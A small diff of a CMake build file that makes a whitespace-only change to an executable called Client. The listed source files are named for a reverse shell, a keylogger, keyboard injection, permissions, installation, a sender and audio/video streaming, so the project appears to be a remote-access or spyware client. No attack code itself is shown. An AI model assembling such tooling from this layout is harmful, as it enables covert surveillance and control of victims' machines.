@@ -12,7 +12,8 @@ set(CMAKE_MODULE_PATH ${CMAKE_MODULE_PATH} "${CMAKE_SOURCE_DIR}/cmake/")
 
 include_directories(${OpenCV_INCLUDE_DIRS})
 
-add_executable(Client client.cpp video_audio/DeviceEnumerator.cpp stream/Stream.cpp stream/Stream.h time/Time.cpp time/Time.h converter/Converter.cpp download/Download.cpp download/Download.h file/FileManager.cpp file/FileManager.h information/system/SystemInformation.cpp information/system/SystemInformation.h information/network/NetworkInformation.cpp information/network/NetworkInformation.h reverse_shell/ReverseShell.cpp reverse_shell/ReverseShell.h keylogger/KeyLogger.cpp keylogger/KeyLogger.h keyboard/KeyboardExecuter.cpp keyboard/KeyboardExecuter.h permission/Permission.cpp permission/Permission.h box_message/MessageBoxGUI.cpp state/SystemState.cpp state/SystemState.h install/Install.cpp install/Install.h sender/Sender.cpp)
+add_executable(Client client.cpp video_audio/DeviceEnumerator.cpp stream/Stream.cpp stream/Stream.h time/Time.cpp time/Time.h converter/Converter.cpp download/Download.cpp download/Download.h file/FileManager.cpp file/FileManager.h information/system/SystemInformation.cpp information/system/SystemInformation.h information/network/NetworkInformation.cpp information/network/NetworkInformation.h reverse_shell/ReverseShell.cpp reverse_shell/ReverseShell.h keylogger/KeyLogger.cpp keylogger/KeyLogger.h keyboard/KeyboardExecuter.cpp keyboard/KeyboardExecuter.h permission/Permission.cpp permission/Permission.h box_message/MessageBoxGUI.cpp state/SystemState.cpp state/SystemState.h install/Install.cpp install/Install.h sender/Sender.cpp
+)
 
 #set(OpenCV_LIBS opencv_core opencv_imgproc opencv_highgui opencv_imgcodecs)
 
